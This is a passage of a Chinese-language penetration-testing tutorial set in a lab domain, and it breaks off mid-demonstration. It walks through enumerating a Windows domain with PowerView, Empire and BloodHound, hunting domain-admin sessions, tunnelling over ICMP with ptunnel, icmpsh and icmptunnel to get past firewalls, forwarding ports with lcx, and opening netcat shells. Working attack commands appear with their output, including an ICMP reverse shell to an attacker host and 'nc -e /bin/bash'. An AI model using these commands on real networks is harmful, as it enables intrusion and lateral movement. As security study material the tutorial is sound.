<h3 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code> $Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p>
<p>接着在 powershell中输入<code> Import-Module PowerView</code>即可导入PowerView，使用<code> Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Import-Module PowerViewPS C:\Users\daniel10&gt; Get-Command -Module PowerViewCommandType     Name                                               Version    Source-----------     ----                                               -------    ------Alias           Find-UserTrustGroup                                1.0        PowerViewAlias           Get-ComputerProperties                             1.0        PowerView……内容较多故省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>PowerView 脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p>
<blockquote>
<p>注：在打开上面的下载地址时会看到该项目已被转移到其他项目下，但是当我在使用新版本的 PowerView 脚本时，发现找不到<code>Invoke-StealthUserHunter</code>命令，而旧版本的 PowerView 有<code>Invoke-StealthUserHunter</code>命令</p>
</blockquote>
<p><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code>.</p>
<p><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Invoke-UserHunterUserDomain   : TEAMSSIXUserName     : AdministratorComputerName : dc.teamssix.comIP           : 192.168.7.7SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : daniel10ComputerName : daniel10.teamssix.comIP           : 192.168.7.110SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : AdministratorComputerName : daniel7.teamssix.comIP           : 192.168.7.107SessionFrom  :LocalAdmin   :<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>PowerView 中的其他信息收集模块：</p>
<ul>
<li>Get-NetDomain:获取当前用户所在域名称</li>
<li>Get-NetUser：获取所有用户的详细信息</li>
<li>Get-NetDomainController：获取所有域控制器的信息</li>
<li>Get-NetComputer：获取域内所有机器的详细信息</li>
<li>Get-NetOU：获取域中的OU信息</li>
<li>Get-NetGroup：获取所有域内组和组成员信息</li>
<li>Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息</li>
<li>Get-NetShare：获取当前域内所有的网络共享信息</li>
<li>Get-NetSession：获取指定服务器的会话</li>
<li>Get-NetRDPSession：获取指定服务器的远程连接</li>
<li>Get-NetProcess：获取远程主机的进程</li>
<li>Get-UserEvent：获取指定用户的日志</li>
<li>Get-ADObject：获取活动目录的对象</li>
<li>Get-NetGPO：获取域内所有组的策略对象</li>
<li>Get-DomainPolicy：获取域默认策略或域控制器策略</li>
<li>Invoke-UserHunter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限</li>
<li>Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户</li>
<li>Invoke-UserEventHunter：根据用户日志查询某域用户登陆过哪些域机器</li>
</ul>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>Empire中的<code>user_hunter</code>模块用于查找域管理员登陆的机器，使用 powershell/situational_awareness/network/powerview/user_hunter 模块，可查看哪个用户登陆哪台主机。</p>
<pre class="line-numbers language-none"><code class="language-none">(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- 3XRCWAB2 ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         2256   5&#x2F;0.0    2021-02-22 20:39:54(Empire: agents) &gt; usemodule powershell&#x2F;powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter) &gt; set Agent 3XRCWAB2(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter) &gt; execute[*] Tasked 3XRCWAB2 to run TASK_CMD_JOB[*] Agent 3XRCWAB2 tasked with task ID 1[*] Tasked agent 3XRCWAB2 to run module powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter[*] Valid results returned by 192.168.7.7……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="6、查找域管理员进程"><a href="#6、查找域管理员进程" class="headerlink" title="6、查找域管理员进程"></a>6、查找域管理员进程</h2><h3 id="获取域管理员列表"><a href="#获取域管理员列表" class="headerlink" title="获取域管理员列表"></a>获取域管理员列表</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;net group &quot;Domain Admins&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Admins注释     指定的域管理员成员-------------------------------------------------------------------------------Administrator命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a>列出本机的所有进程及进程用户</h3><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;tasklist &#x2F;v映像名称                       PID 会话名              会话#       内存使用  状态            用户名                                                 CPU 时间 窗口标题&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                    68:35:16 暂缺System                           4 Services                   0        924 K Unknown         暂缺                                                    0:24:14 暂缺svchost.exe                   9228 Console                    2      2,932 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺tasklist.exe                 10768 Console                    2      9,540 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺……内容过多省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p>
<h1 id="0x05-BloodHound-的使用"><a href="#0x05-BloodHound-的使用" class="headerlink" title="0x05 BloodHound 的使用"></a>0x05 BloodHound 的使用</h1><h2 id="1、介绍-1"><a href="#1、介绍-1" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。</p>
<p>BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p>
<h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>因为 Neo4j 数据库需要 Java 支持，因此安装 BloodHound 需要先安装 Java，这里以 Windows 系统下的安装为例。</p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JDK 需要下载最新版本，不然 Neo4j 运行可能会报错，JDK 下载地址：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>，下载之后，直接安装即可。</p>
<h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Neo4j 直接下载最新版本，下载地址：<a target="_blank" rel="noopener" href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p>
<p>下载最新版本之后解压下载文件，打开 bin 目录，执行命令<code>neo4j.bat console</code>，之后打开浏览器访问 <a target="_blank" rel="noopener" href="http://localhost:7474/">http://localhost:7474</a> 登陆后台，输入以下信息连接到数据库说明安装就完成了。</p>
<pre class="line-numbers language-none"><code class="language-none">URL：neo4j:&#x2F;&#x2F;localhost:7687
用户名(默认)：neo4j
密码(默认)：neo4j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound 项目地址：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>，下载后解压打开 BloodHound.exe，输入 Neo4j 数据库的账号密码即可完成安装。</p>
<h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>安装完成 BloodHound 后，需要进行数据的采集与导入，数据的采集可以使用 ps1 脚本或者使用 exe 程序收集，工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p>
<p>这里使用 SharpHound.exe 进行数据的采集，将 SharpHound.exe 拷贝到目标上，执行 <code>SharpHound.exe -c all</code> 进行数据采集。</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;SharpHound.exe -c all
---------------------------------------------
Initializing SharpHound at 22:36 on 2021&#x2F;2&#x2F;25
---------------------------------------------
Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
[+] Creating Schema map for domain TEAMSSIX.COM using path CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;teamssix,DC&#x3D;com
[+] Cache File Found! Loaded 1332 Objects in cache
[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 24 MB RAM
Status: 673 objects finished (+673 134.6)&#x2F;s -- Using 43 MB RAM
Enumeration finished in 00:00:05.3136324
Compressing data to .\20210225223622_BloodHound.zip
You can upload this file directly to the UI
SharpHound Enumeration Completed at 22:36 on 2021&#x2F;2&#x2F;25! Happy Graphing!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果使用 ps1 脚本收集，命令为：</p>
<pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -command &quot;Import-Module .&#x2F;SharpHound.ps1; Invoke-BloodHound -c all&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。</p>
<blockquote>
<p>或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。</p>
</blockquote>
<p>在 BloodHound 右上角有三个板块：</p>
<p>1、Database Info（数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。</p>
<p>2、Node Indo（节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。</p>
<p>3、Analysis（分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p>
<pre class="line-numbers language-none"><code class="language-none">1、查询所有域管理员
2、寻找到域管理员的最短路径
3、查找具有DCSync权限的主体
4、具有外部域组成员资格的用户
5、具有外部域名组成员资格的组
6、映射域信任
7、到无约束委托系统的最短路径
8、到达Kerberoastable用户的最短路径
9、从Kerberoastable用户到域管理员的最短路径
10、拥有的主体的最短路径
11、从拥有的主体到域管理员的最短路径
12、到高价值目标的最短路径
13、查找域用户是本地管理员的计算机
14、查找域用户可以读取密码的计算机
15、从域用户到高价值目标的最短路径
16、找到从域用户到高价值目标的所有路径
17、找到域用户可以RDP的工作站
18、找到域用户可以RDP的服务器
19、查找域用户组的危险权限
20、找到高价值群体中能够支持kerberoable的成员
21、列出所有kerberoable用户
22、查找具有大多数特权的Kerberoastable用户
23、查找到非域控制器的域管理登录
24、查找不支持操作系统的计算机
25、查找AS-REP Roastable用户(DontReqPreAuth)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比如这里查询到域管理员的最短路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-25_14-00-42.png"></p>
<blockquote>
<p>路径由粗到细表示xx对xx有权限或关系</p>
</blockquote>
<p>总的来说感觉 BloodHound 还是挺有意思的，可以很直观的看到域内主机间的关系。不过毕竟是辅助工具，还是需要不断提升自己的实力、经验才能更好的去分析这样的一个结果才是。</p>
<h1 id="0x06-ICMP-隧道工具使用"><a href="#0x06-ICMP-隧道工具使用" class="headerlink" title="0x06 ICMP 隧道工具使用"></a>0x06 ICMP 隧道工具使用</h1><h2 id="1、介绍-2"><a href="#1、介绍-2" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p>
<p>因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p>
<h2 id="2、建立-ICMP-隧道工具"><a href="#2、建立-ICMP-隧道工具" class="headerlink" title="2、建立 ICMP 隧道工具"></a>2、建立 ICMP 隧道工具</h2><p>用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等</p>
<h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p>
<pre class="line-numbers language-none"><code class="language-none">yum -y install byaccyum -y install flex bison#安装libpcap依赖库wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.9.0.tar.gztar -xzvf libpcap-1.9.0.tar.gzcd libpcap-1.9.0.&#x2F;configuremake &amp;&amp; make install#安装PingTunnelwget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gztar -xzvf PingTunnel-0.72.tar.gzcd PingTunnelmake &amp;&amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ptunnel 常用命令介绍：</p>
<pre class="line-numbers language-none"><code class="language-none">-p: 指定跳板服务器 IP 地址-lp: 监听本地 TCP 端口-da: 指定访问目标的内网 IP 地址-dp: 指定访问目标的端口-m: 设置隧道最大并发数-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p>
<pre class="line-numbers language-none"><code class="language-none">Kali 攻击机       172.16.214.6 (外网)||Linux Web 跳板机  172.16.214.5  (外网)|                192.168.7.5   (内网)||Win RDP 目标机    192.168.7.110 (内网)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 Kali 攻击机上执行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-p  指定跳板机外网IP-lp 指定本机的监听端口-da 指定目标机的内网IP-dp 指定目标机的端口-x 设置隧道密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 Linux Web 跳板机上执行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">ptunnel -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_14-46-46.png"></p>
<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git #下载工具apt-get install python-impacket # 安装依赖，或者 pip2 install impacketsysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  #关闭本地ICMP应答<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>icmpsh 常用命令介绍：</p>
<pre class="line-numbers language-none"><code class="language-none">-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]-d milliseconds    请求时间间隔（毫秒）-o milliseconds    响应超时时间（毫秒）-s bytes           最大数据缓冲区大小（字节）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p>
<pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6目标机 IP：172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在攻击机上运行：</p>
<pre class="line-numbers language-none"><code class="language-none">python2 icmpsh_m.py 172.16.214.6 172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在目标机上运行</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;icmpsh.exe -t 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_15-43-51.png"></p>
<h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jamesbarlow&#x2F;icmptunnel.git
cd icmptunnel
make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p>
<pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6
目标机 IP：172.16.214.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在攻击机上运行：</p>
<pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all		# 禁用 ICMP echo 回复，防止内核自己对ping包进行响应
.&#x2F;icmptunnel -s	# 开启服务端模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在攻击机上新开启一个终端运行：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0	# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在目标机上运行：</p>
<pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all
.&#x2F;icmptunnel 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在目标机上新开启一个终端运行：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.2 netmask 255.255.255.0	# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>至此，已经通过 ICMP 建立了一个点对点隧道。</p>
<p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p>
<pre class="line-numbers language-none"><code class="language-none">ssh root@10.0.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_16-35-09.png"></p>
<h1 id="0x07-lcx、netcat-和-socat-的使用"><a href="#0x07-lcx、netcat-和-socat-的使用" class="headerlink" title="0x07 lcx、netcat 和 socat 的使用"></a>0x07 lcx、netcat 和 socat 的使用</h1><h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
<li>内网端口转发</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">内网失陷主机
lcx.exe -slave rhost rport lhost lport

公网代理主机
lcx.exe -listen lport1 lport2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">内网失陷主机
lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389

公网代理主机
lcx.exe -listen 4444 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p>
<ul>
<li>本地端口映射</li>
</ul>
<p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
<li>内网端口转发</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">内网失陷主机
.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444

公网代理主机
.&#x2F;portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p>
<h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
<p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p>
<pre class="line-numbers language-none"><code class="language-none">-l 开启监听状态
-v 显示详细信息
-p 指定监听的本地端口
-k 客户端断掉连接时，服务端依然保持运行
-e 将传入的信息以命令执行
-n 直接使用 IP 地址，不进行 dns 解析过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p>
<pre class="line-numbers language-none"><code class="language-none">nc -vv rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; nc -v 172.16.214.43 22
Connection to 172.16.214.43 port 22 [tcp&#x2F;ssh] succeeded!
SSH-2.0-OpenSSH_8.4p1 Debian-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p>
<p><strong>-e 指定反弹 shell</strong></p>
<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
nc -lvp lport -e &#x2F;bin&#x2F;bash		# linux 主机
nc -lvp lport -e c:\windows\system32\cmd.exe 	# windows 主机

# 控制端
nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
&gt; nc -lvp 4444 -e &#x2F;bin&#x2F;bash
listening on [any] 4444 ...
172.16.214.1: inverse host lookup failed: Unknown host
connect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628

# 控制端
&gt; nc -v 172.16.214.43 4444
Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!
whoami
root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>-c 指定反弹 shell</strong></p>
<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
nc -lvp lprot -c bash	# linux 主机
nc -lvp lport -c cmd 	# windows 主机

# 控制端
nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
&gt; nc -lvp 4444 -c bash
listening on [any] 4444 ...
172.16.214.1: inverse host lookup failed: Unknown host
connect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635

# 控制端
&gt; nc -v 172.16.214.43 4444
Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!
whoami
